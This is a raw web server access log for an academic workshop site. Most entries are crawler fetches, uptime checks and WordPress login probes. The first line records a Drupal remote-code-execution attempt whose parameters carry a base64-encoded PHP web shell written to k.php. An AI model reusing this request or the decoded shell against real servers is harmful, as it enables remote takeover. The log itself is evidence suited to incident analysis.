www.nspw.org:80 86.126.206.140 - - [30/Apr/2018:11:30:36 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 302 972 "-" "curl/7.47.0"
www.nspw.org:80 14.1.227.15 - - [30/Apr/2018:11:30:59 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 14.1.227.15 - - [30/Apr/2018:11:31:01 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 157.55.39.113 - - [30/Apr/2018:11:31:04 -0400] "GET /papers/2013/nspw2013-durmuth.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.249.73.78 - - [30/Apr/2018:11:32:02 -0400] "GET /papers/1993/nspw1993-denning.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 180.76.15.8 - - [30/Apr/2018:11:33:03 -0400] "GET /papers/?C=N;O=D HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 66.249.73.78 - - [30/Apr/2018:11:33:50 -0400] "GET /modules/system/system.messages.css?nhfa6e HTTP/1.1" 302 611 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [30/Apr/2018:11:33:51 -0400] "GET /modules/system/system.base.css?nhfa6e HTTP/1.1" 302 602 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [30/Apr/2018:11:33:51 -0400] "GET /modules/field/theme/field.css?nhfa6e HTTP/1.1" 302 600 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [30/Apr/2018:11:33:52 -0400] "GET /modules/node/node.css?nhfa6e HTTP/1.1" 302 585 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [30/Apr/2018:11:33:52 -0400] "GET /modules/system/system.menus.css?nhfa6e HTTP/1.1" 302 605 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [30/Apr/2018:11:33:53 -0400] "GET /modules/system/system.theme.css?nhfa6e HTTP/1.1" 302 604 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [30/Apr/2018:11:33:53 -0400] "GET /themes/garland/style.css?nhfa6e HTTP/1.1" 302 590 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [30/Apr/2018:11:33:53 -0400] "GET /modules/comment/comment.css?nhfa6e HTTP/1.1" 302 596 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [30/Apr/2018:11:33:54 -0400] "GET /themes/garland/print.css?nhfa6e HTTP/1.1" 302 590 "http://www.nspw.org/proceedings/2010" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:11:35:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 37.47.166.212 - - [30/Apr/2018:11:35:49 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 37.47.166.212 - - [30/Apr/2018:11:35:50 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 207.46.13.54 - - [30/Apr/2018:11:37:26 -0400] "GET /papers/2002/nspw2002-toyoizumi.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
